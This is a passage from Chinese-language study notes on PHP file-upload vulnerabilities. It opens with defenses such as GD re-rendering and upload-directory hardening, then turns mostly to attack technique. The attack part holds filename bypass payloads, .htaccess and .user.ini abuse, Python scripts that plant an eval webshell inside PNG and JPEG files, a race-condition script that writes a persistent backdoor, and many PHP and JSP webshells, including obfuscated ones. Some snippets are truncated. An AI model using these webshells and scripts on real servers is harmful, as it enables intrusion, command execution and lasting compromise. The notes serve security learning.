echo "图片宽:{$imageInfo[0]} 高:{$imageInfo[1]} 类型:{$imageInfo['mime']}";
```

**`getimagesize()` 返回值结构：**

```php
Array (
    [0] => 800          // 宽度(像素)
    [1] => 600          // 高度(像素)
    [2] => 2            // 类型常量 (IMAGETYPE_JPEG=2)
    [3] => 'width="800" height="600"'
    [bits] => 8
    [channels] => 3
    [mime] => 'image/jpeg'
)
```

**`getimagesize()` 的局限性：**

```
│  只要文件头部符合图像格式规范，后续附加的代码不影响解析结果   │
```

## 3.3 二次渲染校验

### 3.3.1 GD 库重新生成图片的原理
>**二次渲染（Re-rendering）** 是目前对抗图片马最有效的技术手段之一。

**核心思路：**
> 不信任用户上传的文件，服务端将其作为**像素数据**重新解码，再用 GD 库重新编码输出一张全新的图片，**完全丢弃原始文件的二进制结构**。

**数据流对比：** 
```
┌──────────────────────────────────────────────────────────┐
│                    普通上传流程                           │
├──────────────────────────────────────────────────────────┤
│  用户文件  →  [扩展名/MIME校验]  →  直接保存到磁盘           │
│  问题：文件内容原封不动保留，嵌入的代码也被保留                │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│                    二次渲染流程                            │
├──────────────────────────────────────────────────────────┤
│  用户文件                                                 │
│    ↓  [解码阶段：imagecreatefromjpeg()]                   │
│  内存中的像素矩阵（纯颜色数据，无结构信息）                    │
│    ↓  [重编码阶段：imagejpeg()]                            │
│  全新的标准 JPEG 文件（原始二进制结构已丢失）                 │
└──────────────────────────────────────────────────────────┘
```

**PHP GD 库二次渲染实现：**
```php
<?php
function reRenderImage($srcPath, $destPath, $mimeType) {
    switch ($mimeType) {
        case 'image/jpeg':
            // 解码：将 JPEG 文件解码为内存中的图像资源（像素数组）
            $image = imagecreatefromjpeg($srcPath);
            if (!$image) return false;
            
            // 重编码：将像素数据重新编码为 JPEG 文件（quality=85）
            // 新文件由 GD 库生成，格式完全规范，不含任何附加数据
            imagejpeg($image, $destPath, 85);
            break;
            
        case 'image/png':
            $image = imagecreatefrompng($srcPath);
            if (!$image) return false;
            // 保留透明通道
            imagealphablending($image, false);
            imagesavealpha($image, true);
            imagepng($image, $destPath, 6);
            break;
            
        case 'image/gif':
            $image = imagecreatefromgif($srcPath);
            if (!$image) return false;
            imagegif($image, $destPath);
            break;
            
        default:
            return false;
    }
    
    imagedestroy($image); // 释放内存
    return true;
}

// ─── 使用示例 ───
$tmpFile   = $_FILES['file']['tmp_name'];
$imageInfo = getimagesize($tmpFile);

if (!$imageInfo) {
    die('非有效图片文件');
}

$destPath = 'uploads/' . uniqid() . '.jpg';

if (!reRenderImage($tmpFile, $destPath, $imageInfo['mime'])) {
    die('图片处理失败');
}

echo '上传成功：' . $destPath;
```

**二次渲染的关键步骤详解：**
```
imagecreatefromjpeg('shell_with_php.jpg')
        │
        │ 解码过程：
        │ ① 读取 JPEG 文件头，确认为合法 JPEG
        │ ② 解析 DCT 压缩数据，还原像素矩阵
        │ ③ 丢弃所有非像素数据（EXIF、注释、附加字节、PHP代码）
        │
        ▼
  $image = [像素矩阵：800×600 个 RGB 值]
        │
        │ 重编码过程：
        │ ① GD 库从像素矩阵重新计算 DCT 系数
        │ ② 生成全新的符合 JPEG 规范的二进制文件
        │ ③ 生成标准文件头，不含任何附加内容
        │
        ▼
  输出：干净的 output.jpg（无任何恶意代码残留）
```

### 3.3.2 为什么二次渲染能防御但不完全可靠

- **二次渲染的防御能力**
```
┌─────────────────────────────────────────────────────────┐
│            二次渲染能清除的恶意内容                        │
├─────────────────────────────────────────────────────────┤
│  ✅ 文件尾部追加的 PHP 代码（常见图片马技术）               │
│  ✅ EXIF 元数据中嵌入的脚本代码                           │
│  ✅ JPEG 注释段（APP1/COM 段）中的代码                    │
│  ✅ 文件头附加的代码字节                                  │
│  ✅ PNG 文本块（tEXt、zTXt）中嵌入的代码                 │
└─────────────────────────────────────────────────────────┘
```

- **二次渲染的局限性**×4

**局限一：GIF 二次渲染幸存区**

GIF 文件的二次渲染存在特殊情况。GD 库在处理 GIF 时，部分数据块内容会在重渲染后**幸存**，攻击者可精心构造 payload 嵌入到渲染后仍保留的区域。

```
┌──────────────────────────────────────────────────────────────┐
│  GIF 文件结构                                                 │
├──────────────────────────────────────────────────────────────┤
│  Header(6B) │ LogicalScreenDesc │ ColorTable │ ImageData...  │
│                                                              │
│  GD 重渲染时：ColorTable（颜色表）数据有时部分幸存                │
│  攻击者可将 PHP payload 编码进颜色表数值中                       │
│                                                              │
│  典型 payload: <?php @eval($_POST[cmd]);?>                    │
│  → 编码为颜色表中的特定 RGB 值序列                               │
│  → 二次渲染后仍出现在颜色表区域                                  │
└──────────────────────────────────────────────────────────────┘
```

**局限二：有损压缩导致防御失效的利用**

JPEG 使用有损压缩，二次渲染会改变像素值。攻击者可以：

1. 先上传一张普通图片
2. 下载服务器二次渲染后的版本
3. 对比渲染前后的差异，找到**渲染后仍保留的字节位置**
4. 在这些位置精确植入 PHP payload
5. 再次上传，payload 在二次渲染后仍存活

```python
# 攻击者的自动化工具思路（概念示意）
import struct

# 1. 找到渲染前后保持不变的字节偏移量
# 2. 在这些偏移量处植入 PHP 代码字节
# 3. 确保植入代码不破坏图片合法性
# 4. 上传 → 二次渲染 → payload 仍存在 → 配合文件包含触发执行
```

**局限三：依赖文件包含或错误配置才能执行**

```
┌──────────────────────────────────────────────────────────────┐
│  二次渲染后的图片马，仍需配合以下条件才能执行代码：                 │
├──────────────────────────────────────────────────────────────┤
│  ① 文件包含漏洞（LFI）: include($_GET['file'])                 │
│  ② Web 服务器将图片目录配置为可执行 PHP                          │
│  ③ 其他代码执行入口（eval、assert 等）                          │
│                                                              │
│  如果上传目录正确配置为"禁止脚本执行"，                           │
│  即使图片马幸存，也无法被执行                                    │
└──────────────────────────────────────────────────────────────┘
```

**局限四：其他图像处理库的差异**

不同图像处理库（Pillow、ImageMagick、libvips）的渲染行为有差异，某些库可能保留更多原始数据。ImageMagick 历史上存在 **ImageTragick（CVE-2016-3714）** 漏洞，处理恶意图片时直接 RCE。

## 3.4 综合防御建议（扩展）

没有任何单一校验机制是绝对安全的，必须**多层防御叠加**：

```
┌─────────────────────────────────────────────────────────────────┐
│                     文件上传防御纵深模型                          │
├────────┬────────────────────────────────────────────────────────┤
│  层级  │  防御措施                                               │
├────────┼────────────────────────────────────────────────────────┤
│ 第1层  │  白名单扩展名校验（非黑名单）                           │
├────────┼────────────────────────────────────────────────────────┤
│ 第2层  │  文件内容校验（getimagesize 或完整格式解析）             │
├────────┼────────────────────────────────────────────────────────┤
│ 第3层  │  二次渲染（GD库重生成）                                 │
├────────┼────────────────────────────────────────────────────────┤
│ 第4层  │  文件重命名（随机UUID，丢弃原始文件名）                  │
├────────┼────────────────────────────────────────────────────────┤
│ 第5层  │  上传目录禁止脚本执行（Nginx/Apache 配置）               │
├────────┼────────────────────────────────────────────────────────┤
│ 第6层  │  存储隔离（上传文件存储于独立域名/对象存储，如 OSS）      │
├────────┼────────────────────────────────────────────────────────┤
│ 第7层  │  文件大小限制 + 频率限制（防DoS）                       │
├────────┼────────────────────────────────────────────────────────┤
│ 第8层  │  WAF 规则检测（辅助防线）                               │
└────────┴────────────────────────────────────────────────────────┘
```

**Nginx 禁止上传目录执行脚本（关键配置）：**
```nginx
location /uploads/ {
    # 禁止将上传目录下的文件作为 PHP 脚本执行
    location ~* \.php$ {
        deny all;
        return 403;
    }
    
    # 或者完全禁用 CGI/FastCGI 处理
    autoindex off;
}
```

## 4.3 文件扩展名绕过

### 4.3.1 黑名单绕过

#### 大小写变换

**原理：** 黑名单比较时未做大小写归一化，而 Windows/部分 Linux 配置大小写不敏感。
```php
// 漏洞代码：未转小写
$blacklist = ['php', 'php5', 'phtml'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
// 注意：未调用 strtolower()

if (in_array($ext, $blacklist)) {
    die('不允许');
}
// 上传 shell.PHP → $ext = "PHP" → 不在黑名单 → 绕过
```

**绕过 Payload：**
```
shell.PHP
shell.PhP
shell.pHp
shell.PHP5
shell.Phtml
```

---

#### 等价后缀名

这个在看到`strrchr($file_name, '.');`的时候可以使用，因为这个函数的作用是提取最后一个后缀

PHP 支持多种扩展名，Apache 默认配置中均可解析执行：
```
┌─────────────────────────────────────────────────────┐
│           PHP 等价可执行扩展名                        │
├─────────────┬───────────────────────────────────────┤
│  扩展名      │  说明                                 │
├─────────────┼───────────────────────────────────────┤
│  .php       │  标准 PHP 文件                         │
│  .php3      │  PHP 3 时代遗留，Apache 默认仍可解析     │
│  .php4      │  同上                                  │
│  .php5      │  PHP 5 显式扩展名                       │
│  .php7      │  PHP 7 显式扩展名                       │
│  .phtml     │  PHP 混合 HTML，Apache 默认解析         │
│  .pht       │  部分 Apache 配置支持                   │
│  .phar      │  PHP 归档文件，可执行                   │
│  .shtml     │  SSI 文件（可执行 SSI 指令）            │
└─────────────┴───────────────────────────────────────┘
```

**Apache 配置来源（/etc/apache2/mods-enabled/php.conf）：**

```apache

<FilesMatch ".+\.ph(ar|p|tml)$">

</FilesMatch>
```

#### 双写绕过

**原理：** 服务端用字符串替换删除黑名单关键词，但只替换一次，导致双写后仍能还原。

```php
// 漏洞代码：str_replace 只删除一次
$ext = str_replace(['php', 'phtml'], '', $uploadName);
// 处理: shell.pphphp → 删除中间的 php → shell.php
// 处理: shell.phphpp → 删除第一个 php → shell.hp (无效，此例无效)
// 处理: shell.pHPp  → 未匹配（大小写问题）
```

**有效双写 Payload 构造逻辑：**

```
目标: 最终扩展名为 php
构造: pHPp 或 pphphp 或 ppHpHp 

str_replace('php', '', 'pHPp')   → 'pHPp'（大小写不匹配，无效）
str_replace('php', '', 'phphp')  → 'php' ✅  绕过成功！

文件名: shell.phphp
删除 php 后: shell.php → 最终保存为 shell.php
```

**常见双写变形：**

```
shell.pphphp     → 删除中间php → shell.php
shell.phpphp     → 删除前php  → shell.php
shell.php.php    → 取最后扩展名 php（另一种场景）
```

#### 点和空格绕过

**原理：Windows 文件系统特性**，文件名末尾的点和空格会被系统自动去除。
```
shell.php.   → Windows 保存时自动去除末尾点 → shell.php
shell.php    → Windows 保存时自动去除末尾空格 → shell.php
shell.php. . → 混合使用
```

**PHP 漏洞代码：**
```php
// 漏洞代码：未过滤点和空格
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
// filename="shell.php."
// pathinfo 提取扩展名: "php."  → 不在黑名单 ['php','phtml'] → 绕过

// 保存文件时在 Windows 下:
move_uploaded_file($tmp, 'uploads/shell.php.');
// Windows NTFS 自动去除末尾点 → 实际保存为 shell.php
```

**Burp 修改 filename 字段：**
```http
filename="shell.php."       ← 末尾加点
filename="shell.php "       ← 末尾加空格（注意空格）
filename="shell.php. ."     ← 点空格点
```

### 4.3.2 白名单绕过
>白名单绕过难度更高，需要利用语言/系统层面的特殊漏洞。

#### %00 截断（PHP < 5.3.4）

**原理：** C 语言中字符串以 `\0`（NULL 字节）结尾。PHP 底层文件操作调用 C 函数时，遇到 `\0` 截断字符串，导致后续字符被忽略。
```
攻击场景：
服务端逻辑：
  $ext = pathinfo($name, PATHINFO_EXTENSION);  // 取最后扩展名
  白名单校验 $ext === 'jpg' → 通过
  保存路径: $savePath = 'uploads/' . $name;
  move_uploaded_file($tmp, $savePath);

攻击构造：
  filename = "shell.php%00;.jpg"
  
  步骤分解：
  ① pathinfo() 提取扩展名 → "jpg" → 白名单通过 ✅
  ② move_uploaded_file() 调用 C 的文件操作函数
  ③ 路径字符串: "uploads/shell.php\0.jpg"
  ④ C 函数遇到 \0 截断 → 实际路径: "uploads/shell.php"
  ⑤ 最终保存为 shell.php ✅
```

**Burp 操作：**
这里加上我自己操作过的步骤
```
上传一个一句话木马，抓包，将文件名修改问up.php%00;.jpg，如果文件GET也有路径，也加上Up.php%00;.jpg（例如CTFHUB上的00截断题目）
```

```
方法1: 在 Hex 视图中，找到 filename 值
       将 %00 对应位置改为 00 字节（十六进制）

方法2: 在 Repeater 中直接输入 shell.php%00;.jpg
       需要在 URL 解码模式下操作
```

**影响版本：**
```
PHP < 5.3.4  →  move_uploaded_file() 存在 \0 截断
PHP >= 5.3.4 →  已修复，\0 字节会触发警告并失败
```

---

#### 路径截断（`../` 路径穿越）

**原理：** 某些实现中，服务端拼接上传路径时未过滤 `../`，导致文件保存到预期目录之外。

```php
// 漏洞代码示意
$uploadDir = 'uploads/images/';
$filename  = $_FILES['file']['name'];  // 未过滤路径字符

// 攻击者输入: filename="../../shell.php"
// 最终路径:  uploads/images/../../shell.php
//          = shell.php（Web 根目录下）
$savePath = $uploadDir . $filename;
move_uploaded_file($tmp, $savePath);
```

**结合白名单的绕过：**

```
filename="../../shell.php  .jpg"
  → 白名单检查扩展名为 jpg → 通过
  → 路径拼接时 ../ 穿越目录
  → 实际保存位置不在 uploads/images/ 中
  → 若能访问到，可直接 getshell
```

### 4.3.3 .htaccess 文件利用

**原理：** Apache 的 `.htaccess` 是目录级配置文件，可覆盖服务器主配置，**重新定义文件解析规则**。

**攻击步骤：**
```
Step 1: 上传 .htaccess 文件（黑名单通常不包含 .htaccess）

Step 2: .htaccess 内容：
        # 方案A：将所有 .jpg 文件按 PHP 解析
        AddType application/x-httpd-php .jpg

        # 方案B：将所有文件按 PHP 解析
        SetHandler application/x-httpd-php

        # 方案C：指定特定文件名
        <Files "shell.jpg">
            SetHandler application/x-httpd-php
        </Files>

Step 3: 上传 shell.jpg（内容为 PHP 代码）

Step 4: 访问 /uploads/shell.jpg → Apache 按 PHP 解析 → RCE
```

**完整攻击 Payload：**
```apache
# .htaccess 文件内容
# 将上传目录下所有 .png .jpg .gif 文件均当 PHP 执行
AddType application/x-httpd-php .png .jpg .gif .jpeg
```

**前提条件：**
```
✅ Apache 服务器（Nginx 不支持 .htaccess）
✅ AllowOverride 配置允许（All 或包含 FileInfo）
✅ 黑名单未包含 .htaccess
✅ 上传文件名保持原样（未被重命名）
```

### 4.3.4 .user.ini 文件利用

**原理：** PHP 支持在目录级别放置 `.user.ini` 文件，覆盖部分 `php.ini` 配置。其中 `auto_prepend_file` 和 `auto_append_file` 指令会在**每个 PHP 文件执行前/后**自动包含指定文件。

```
auto_prepend_file = /path/to/file
# 效果：在本目录中每个 PHP 文件执行前，自动 require 指定文件
```

**攻击步骤：**

```
Step 1: 上传 .user.ini，内容为：
        auto_prepend_file=shell.jpg

Step 2: 上传 shell.jpg，内容为：
        <?php @eval($_POST['cmd']); ?>

Step 3: 访问该目录下任意合法 PHP 文件（如 index.php）
        → PHP 自动在执行 index.php 前包含 shell.jpg
        → shell.jpg 中的 PHP 代码被执行
        → RCE 成功
```

**.htaccess vs .user.ini 对比：**

```
┌─────────────────┬──────────────────┬──────────────────┐
```

#### GIF 不变区域写入代码

#### PNG 的 PLTE / IDAT 数据块写入

PNG 是块（Chunk）结构，每个块：`[4B 长度][4B 类型][数据][4B CRC校验]`
```
┌─────────────────────────────────────────────────┐
│  PNG 文件结构                                    │
├─────────────────────────────────────────────────┤
│  Signature: 89 50 4E 47 0D 0A 1A 0A            │
│  IHDR Chunk  ← 图像基本信息                     │
│  PLTE Chunk  ← 调色板（索引色图才有）✅ 幸存区   │
│  IDAT Chunk  ← 压缩的图像数据（Deflate压缩）    │
│  tEXt Chunk  ← 文本注释（渲染后通常丢失）❌      │
│  IEND Chunk  ← 文件结尾                         │
└─────────────────────────────────────────────────┘
```

**PNG IDAT 块写入原理（高级技术）：**
```
IDAT 块存储 Deflate 压缩数据，解压后为像素行
二次渲染：
  原 IDAT → 解压 → 像素矩阵 → 重压缩 → 新 IDAT
  
理论上：相同像素 → 相同压缩结果
但 PHP GD 的压缩参数可能与原始不同 → 数据变化

攻击思路（需要工具辅助）：
1. 分析目标服务器 GD 库版本和压缩参数
2. 预计算：什么样的原始像素数据，经过该 GD 版本
   重新压缩后，会在 IDAT 中产生 "<?php" 字节序列
3. 构造满足条件的图片并上传
```

**PNG PLTE 块写入（相对可靠）：**
```python
#!/usr/bin/env python3
import struct
import zlib

def make_png_with_payload_in_plte():
    """
    在 PNG PLTE 块中嵌入 PHP payload
    PLTE 块为调色板数据，二次渲染时颜色表有时被保留
    """
    
    # PNG 文件头
    png_sig = b'\x89PNG\r\n\x1a\n'
    
    # IHDR: 宽1像素，高1像素，8位，索引色(3)
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 3, 0, 0, 0)
    ihdr_crc  = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr_chunk = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    
    # PLTE: 调色板（每个条目3字节RGB）
    # 在调色板数据中嵌入 payload
    payload     = b'<?php @eval($_POST[cmd]); ?>'
    # 补齐到3的倍数
    pad_len     = (3 - len(payload) % 3) % 3
    plte_data   = payload + b'\x00' * pad_len
    plte_crc    = zlib.crc32(b'PLTE' + plte_data)
    plte_chunk  = struct.pack('>I', len(plte_data)) + b'PLTE' + plte_data + struct.pack('>I', plte_crc)
    
    # IDAT: 最简单的1x1像素数据（索引0）
    raw_data    = b'\x00\x00'  # 过滤类型0 + 像素值0
    idat_data   = zlib.compress(raw_data)
    idat_crc    = zlib.crc32(b'IDAT' + idat_data)
    idat_chunk  = struct.pack('>I', len(idat_data)) + b'IDAT' + idat_data + struct.pack('>I', idat_crc)
    
    # IEND
    iend_crc    = zlib.crc32(b'IEND')
    iend_chunk  = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    
    png_data = png_sig + ihdr_chunk + plte_chunk + idat_chunk + iend_chunk
    
    with open('shell.png', 'wb') as f:
        f.write(png_data)
    print("[+] shell.png 生成完毕，PLTE 块含有 PHP payload")

make_png_with_payload_in_plte()
```

#### JPEG Comment 段写入

JPEG 文件结构由多个"段（Segment）"组成，每段格式：`FF [标记码] [长度] [数据]`

**JPEG COM 段注入：**
```python
#!/usr/bin/env python3
import struct

def inject_jpeg_comment(input_jpg, output_jpg, payload):
    """
    在 JPEG 文件中注入 COM (Comment) 段
    FF FE [2字节长度] [注释内容]
    """
    with open(input_jpg, 'rb') as f:
        jpg_data = f.read()
    
    # 构造 COM 段
    # 长度字段包含自身2字节
    payload_bytes = payload.encode('utf-8')
    com_len       = len(payload_bytes) + 2  # +2 for length field itself
    com_segment   = b'\xFF\xFE' + struct.pack('>H', com_len) + payload_bytes
    
    # 插入到 SOI (FF D8) 之后，APP0 (FF E0) 之前
    soi = jpg_data[:2]        # FF D8
    rest = jpg_data[2:]       # 剩余数据
    
    new_jpg = soi + com_segment + rest
    
    with open(output_jpg, 'wb') as f:
        f.write(new_jpg)
    
    print(f"[+] 已注入 Comment 段到 {output_jpg}")
    print(f"[+] Payload: {payload}")

inject_jpeg_comment(
    'normal.jpg',
    'shell.jpg',
    '<?php @eval($_POST["cmd"]); ?>'
)
```

## 4.5 条件竞争绕过（Race Condition）

### 4.5.1 竞争窗口原理（先存后删）

**漏洞场景：** 某些服务端的处理逻辑是：

```
① 接收上传文件 → ② 保存到磁盘（临时/正式） → ③ 异步校验文件内容 → ④ 不合法则删除
```

在步骤②和④之间存在一个**极短的时间窗口**，文件已存在于磁盘上但尚未被删除。

```
时间轴：

t=0ms   ← 文件上传完成，保存到 /uploads/shell.php
t=1ms   ← 服务端开始校验文件内容
t=2ms   ← 校验发现为 PHP 文件
t=3ms   ← 执行删除操作
t=4ms   ← 文件被删除

攻击目标：在 t=0ms ~ t=3ms 的窗口内访问 /uploads/shell.php
          让 PHP 文件被执行一次，即可建立持久后门
```

**易受攻击的 PHP 代码模式：**

```php
<?php
$uploadPath = 'uploads/' . $_FILES['file']['name'];

// ① 先保存文件（此时文件已存在于磁盘）
move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);

// ② 再校验（存在竞争窗口！）
$ext = pathinfo($uploadPath, PATHINFO_EXTENSION);
if (!in_array($ext, ['jpg', 'png', 'gif'])) {
    unlink($uploadPath);  // ③ 删除非法文件
    die('不允许的文件类型');
}

echo '上传成功';
```

### 4.5.2 利用方式（多线程并发上传+访问）

**利用思路：**

```
线程组A（持续上传）: 不断上传 shell.php
线程组B（持续访问）: 不断访问 /uploads/shell.php

期望：B 中某次请求恰好命中 shell.php 存在的窗口
      → shell.php 被执行一次
      → 在 shell.php 中写入永久 WebShell
```

**Python 多线程利用脚本：**

```python
import threading
import time

TARGET_SHELL  = "http://target.com/uploads/shell.php"
SUCCESS_FLAG  = threading.Event()  # 成功标志

# WebShell 内容：执行后写入永久 shell
SHELL_CONTENT = """<?php
// 被访问时，将永久 webshell 写入另一个文件
file_put_contents('../backdoor.php', '<?php @eval($_POST[cmd]); ?>');
echo 'done';
?>"""

def upload_thread():
    """持续上传 shell.php"""
    session = requests.Session()
    while not SUCCESS_FLAG.is_set():
        try:
            files = {
                'file': ('shell.php', SHELL_CONTENT, 'image/jpeg')
            }
            session.post(TARGET_UPLOAD, files=files, timeout=5)
        except Exception:
            pass

def access_thread():
    """持续访问 shell.php，检测是否成功执行"""
    session = requests.Session()
    while not SUCCESS_FLAG.is_set():
        try:
            resp = session.get(TARGET_SHELL, timeout=3)
            if resp.status_code == 200 and 'done' in resp.text:
                print(f"\n[!!!] 竞争成功！永久 Shell 已写入 /backdoor.php")
                SUCCESS_FLAG.set()  # 通知所有线程停止
        except Exception:
            pass

def main():
    print("[*] 开始条件竞争攻击...")
    print(f"[*] 目标上传接口: {TARGET_UPLOAD}")
    print(f"[*] 目标访问路径: {TARGET_SHELL}")
    
    threads = []
    
    # 启动上传线程（多个并发）
    for i in range(5):
        t = threading.Thread(target=upload_thread, name=f"Upload-{i}")
        t.daemon = True
        t.start()
        threads.append(t)
    
    # 启动访问线程（多个并发）
    for i in range(10):
        t = threading.Thread(target=access_thread, name=f"Access-{i}")
        t.daemon = True
        t.start()
        threads.append(t)
    
    # 等待成功或超时
    SUCCESS_FLAG.wait(timeout=60)
    
    if SUCCESS_FLAG.is_set():
        print("[+] 攻击成功！验证永久 Shell:")
        print(f"    URL: http://target.com/backdoor.php")
        print(f"    参数: cmd=phpinfo();")
    else:
        print("[-] 超时，攻击未成功，可能竞争窗口太小")

if __name__ == '__main__':
    main()
```

## 4.6 短标签绕过

### 4.6.1 概述

PHP 有 **4 种脚本开始 / 结束标记**，最常用的是长标签 `<?php ?>`，剩下 3 种都叫**短标签**：

1. **`<? ?>`** —— **最核心、最常用、最危险**
2. **`<?= ?>`** —— 输出短标签（等价 `<?php echo ?>`，默认开启）
3. **`<% %>`** —— ASP 风格标签（几乎废弃）

### 4.6.2 核心作用

- **超短webshell**

```
<?=
@eval($_POST['cmd']);
?>
```

- **绕过WAF**
- 适配过滤场景

### 4.6.3 生效前提

是否生效取决于PHP配置

```ini
short_open_tag = On
```

- **On** → `<? ?>` 可以正常执行

- **Off** → `<? ?>` 只会被当作普通文本输出，**不执行**

> [!CAUTION]
>
> **PHP 5.x 默认 On** | **PHP 7.0+ 默认 Off**

# 5. WebShell 基础
## 5.1 什么是 WebShell
>**WebShell** 是攻击者上传到 Web 服务器上的**恶意脚本文件**，通过 HTTP/HTTPS 协议与攻击者进行交互，本质上是一个"寄宿在 Web 服务中的远程命令执行后门"。

### 核心特征
```
┌─────────────────────────────────────────────────────────────────┐
│                      WebShell 本质                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   攻击者浏览器                         目标 Web 服务器             │
│       │                                      │                  │
│       │  HTTP POST /shell.php                │                  │
│       │  cmd=system('whoami');               │                  │
│       │ ─────────────────────────────────>   │                  │
│       │                                      │  ① 接收请求       │
│       │                                      │  ② 执行系统命令    │
│       │                                      │  ③ 返回结果       │
│       │  HTTP 200 OK                         │                  │
│       │  www-data                            │                  │
│       │ <─────────────────────────────────   │                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### WebShell 的本质定位
```
┌──────────────────┬──────────────────────────────────────────────┐
│  维度             │  说明                                        │
├──────────────────┼──────────────────────────────────────────────┤
│  载体形式         │  PHP / ASP / ASPX / JSP / Python 等脚本文件  │
│  传输协议         │  HTTP / HTTPS（80/443端口，极难被防火墙拦截） │

│  权限继承         │  以 Web 服务进程权限运行（如 www-data）        │
└──────────────────┴──────────────────────────────────────────────┘
```


## 5.2 一句话木马
>一句话木马是 WebShell 中**最精简**的形态，通常只有一行代码，核心逻辑是：**接收外部传入的数据，并将其作为代码执行**。

### 核心执行模型

```
HTTP 请求参数（攻击者控制）
        │
        ▼
  ┌─────────────┐
  │  eval() /   │   ← 代码执行函数（危险函数）
  │  assert() / │
  │  system()   │
  └─────────────┘
        │
        ▼
   系统命令 / PHP 代码执行
        │
        ▼
   结果返回给攻击者
```

---

### 5.2.1 PHP 一句话木马

#### 基础版本

```php
<?php @eval($_POST['cmd']); ?>
```

**逐字段解析：**

```
@           → 错误抑制符，执行出错时不显示任何报错信息（提高隐蔽性）
eval()      → PHP 内置函数，将字符串作为 PHP 代码执行
$_POST['cmd'] → 从 HTTP POST 请求的 cmd 参数获取待执行代码
```

**使用方式：**

```http
POST /uploads/shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=system('whoami');
cmd=system('cat /etc/passwd');
cmd=phpinfo();
```

---

#### 常见变体

- **变体一：使用 `assert()`**

```php
<?php @assert($_POST['cmd']); ?>

// assert() 在 PHP 5 中同样可以执行字符串代码
// PHP 7.2+ 开始，字符串 assert 已废弃但未完全禁用
// 部分 WAF 规则只过滤 eval，此时可用 assert 绕过
```

- **变体二：使用 `$_GET` 参数**

```php
<?php @eval($_GET['cmd']); ?>
// 通过 URL 参数传递：
// http://target.com/shell.php?cmd=system('id');
```

- **变体三：使用 `$_REQUEST`（兼容 GET 和 POST）**

```php
<?php @eval($_REQUEST['cmd']); ?>
```

- **变体四：`system()` 直接执行系统命令**

```php
<?php system($_GET['cmd']); ?>
// 只能执行系统命令，不能执行 PHP 代码
// 但更直接，无需在参数里加分号
// 访问: shell.php?cmd=id
```

- **变体五：`passthru()` 执行命令**

```php
<?php passthru($_POST['cmd']); ?>
// 与 system() 类似，直接输出命令结果
// 差异：passthru 输出原始二进制，适合处理图像等二进制命令输出
```

- **变体六：`preg_replace` 执行代码（PHP < 7.0）**

```php
<?php preg_replace('/.*/e', $_POST['cmd'], ''); ?>
// /e 修饰符使替换字符串被当作 PHP 代码执行
// PHP 7.0 后 /e 修饰符已被移除
```

- **变体七：回调函数类**

```php
<?php array_map('assert', [$_POST['cmd']]); ?>

<?php call_user_func('assert', $_POST['cmd']); ?>

<?php call_user_func_array('assert', [$_POST['cmd']]); ?>
```

- **变体八：动态函数名（绕过关键词检测）**

```php
<?php
$f = 'sys'.'tem';   // 拼接字符串，规避静态检测
$f($_GET['cmd']);
?>

<?php
$f = base64_decode('c3lzdGVt');  // base64('system')
$f($_GET['cmd']);
?>
```

- **变体九：编码混淆版**

```php
// Base64 编码的 eval
<?php eval(base64_decode('cGhwaW5mbygpOw==')); ?>
// base64_decode('cGhwaW5mbygpOw==') = 'phpinfo();'

// 实战中 cmd 参数也可先 base64 再解码执行
<?php @eval(base64_decode($_POST['cmd'])); ?>
```

- **PHP 危险函数速查：**

```
┌─────────────────────┬─────────────────────────────────────┐
│  函数                │  功能                               │
├─────────────────────┼─────────────────────────────────────┤
│  eval()             │  执行 PHP 字符串代码                 │
│  assert()           │  断言（PHP5 可执行字符串）            │
│  system()           │  执行系统命令，输出结果               │
│  exec()             │  执行系统命令，返回最后一行            │
│  passthru()         │  执行系统命令，输出原始结果            │
│  shell_exec()       │  执行系统命令，返回完整输出字符串      │
│  popen()            │  打开进程管道                        │
│  proc_open()        │  高级进程控制                        │
│  `command`          │  反引号，同 shell_exec               │
│  preg_replace(/e)   │  正则替换执行代码（PHP<7）            │
└─────────────────────┴─────────────────────────────────────┘
```

### 5.2.3 JSP 一句话木马

JSP 运行于 Java Web 容器（Tomcat/JBoss/WebLogic），功能强大但代码相对复杂。

#### 基础命令执行版

```jsp
<%
    // 获取 cmd 参数并执行系统命令

            new java.io.InputStreamReader(process.getInputStream())
        );

        StringBuilder output = new StringBuilder();
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

```

#### eval 风格版本（使用 ScriptEngine）

```jsp
<%@ page import="javax.script.*" %>

                              .getEngineByName("javascript");
    engine.put("request",  request);
    engine.put("response", response);
    engine.put("out",      out);

%>
```

#### 精简单行版（常见 CTF/渗透版本）

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
// 注意：此版本无法获取命令输出，仅能执行命令（盲命令执行）
```

#### 带回显的完整版（实战常用）

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    
    if(cmd != null){
        String[] commands;
        // 判断操作系统，选择 shell 类型
        if(System.getProperty("os.name").toLowerCase().contains("win")){
            commands = new String[]{"cmd.exe", "/c", cmd};
        } else {
            commands = new String[]{"/bin/bash", "-c", cmd};
        }
        
        Process proc = Runtime.getRuntime().exec(commands);
        
        BufferedReader stdInput = new BufferedReader(
            new InputStreamReader(proc.getInputStream()));
        BufferedReader stdError = new BufferedReader(
            new InputStreamReader(proc.getErrorStream()));
        
        String s;
        while((s = stdInput.readLine()) != null)  output += s + "\n";
        while((s = stdError.readLine()) != null)  output += "[ERR] " + s + "\n";
    }
    
    out.println("<pre>" + output + "</pre>");
%>
```


## 5.3 小马与大马的区别

WebShell 按功能体量分为"小马"和"大马"，各有不同的适用场景。

### 小马（Mini Shell）

**定义：** 功能极简，代码量极少，通常只提供**命令执行**或**文件上传**能力。

**典型代表：**

```php
<?php @eval($_POST['cmd']); ?>      // 一句话木马（最小形态）
```

```php
<?php
// 稍大的小马：支持文件上传功能
if(isset($_FILES['f'])){
    move_uploaded_file(
        $_FILES['f']['tmp_name'],
